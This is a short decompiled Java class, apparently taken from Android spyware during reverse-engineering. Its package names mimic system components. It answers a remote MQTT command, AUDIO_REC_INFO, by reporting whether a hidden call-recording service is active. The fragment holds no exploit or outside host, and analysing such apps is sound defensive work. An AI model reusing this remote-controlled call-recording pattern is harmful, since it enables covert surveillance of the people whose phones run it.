package com.app.system.common.commands;

import android.content.Context;
import com.android.system.RecordCallService;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;

public class AudioRecInfo
  extends Command
{
  public static final String CMD_NAME = "AUDIO_REC_INFO";
  public static Command.Factory sFactory = new Command.Factory()
  {
    public Command a(MqttCommand paramAnonymousMqttCommand)
    {
      return new AudioRecInfo(paramAnonymousMqttCommand, null);
    }
  };
  
  private AudioRecInfo(MqttCommand paramMqttCommand)
  {
    super(paramMqttCommand);
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    paramContext = this.mqttCmd.b(paramContext);
    if (RecordCallService.b()) {
      paramContext.result = 313;
    } else {
      paramContext.result = 314;
    }
    paramContext.replyText = MqttCommandReply.a(paramContext.result);
    return paramContext;
  }
}


/* Location:              ~/com/app/system/common/commands/AudioRecInfo.class
 *
 * Reversed by:           J
 */